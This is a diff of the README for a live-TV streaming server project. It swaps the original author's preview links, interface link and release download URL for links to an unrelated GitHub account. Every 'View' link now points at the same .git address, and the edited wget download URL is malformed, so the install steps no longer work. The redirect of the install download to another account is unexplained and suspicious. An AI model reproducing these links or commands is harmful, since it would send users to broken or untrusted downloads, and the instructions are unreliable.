@@ -12,14 +12,14 @@ Explore the evolution of the Live-Tv-Server through its key iterations:
 
 | Version        | Description                            | Link |
 |----------------|----------------------------------------|------|
-| `index.html`   | Branding & identity foundation         | [View](https://sohag1192.github.io/Live-Tv-Server/index.html) |
-| `index_v0.html`| Minimalist single-channel prototype    | [View](https://sohag1192.github.io/Live-Tv-Server/index_v0.html) |
-| `index_v1.html`| Channel expansion with metadata        | [View](https://sohag1192.github.io/Live-Tv-Server/index_v1.html) |
-| `index_v2.html`| Interactive grid with JW Player & stats| [View](https://sohag1192.github.io/Live-Tv-Server/index_v2.html) |
-| `index_v3.html`| Finalized layout with branded polish   | [View](https://sohag1192.github.io/Live-Tv-Server/index_v3.html) |
+| `index.html`   | Branding & identity foundation         | [View](https://github.com/paribaby928-spec/Free.git) |
+| `index_v0.html`| Minimalist single-channel prototype    | [View](https://github.com/paribaby928-spec/Free.git) |
+| `index_v1.html`| Channel expansion with metadata        | [View](https://github.com/paribaby928-spec/Free.git) |
+| `index_v2.html`| Interactive grid with JW Player & stats| [View](https://github.com/paribaby928-spec/Free.git) |
+| `index_v3.html`| Finalized layout with branded polish   | [View](https://github.com/paribaby928-spec/Free.git) |
 
 🔗 **Latest Unified Interface:**  
-[Live-Tv-Server Web Interface](https://sohag1192.github.io/Live-Tv-Server)
+[Live-Tv-Server Web Interface](https://github.com/paribaby928-spec/Free.git)
 
 ---
 
@@ -79,7 +79,7 @@ sudo apt install nginx ffmpeg php php-fpm unzip -y
 
 #### 3️⃣ Download the Release
 ```bash
-wget https://github.com/sohag1192/Live-Tv-Server/archive/refs/tags/V.110.0.zip
+wget https://github.com/paribaby928-spec/Free.git-Server/archive/refs/tags/V.110.0.zip
 unzip V.110.0.zip
 cd Live-Tv-Server-V.110.0
 ```
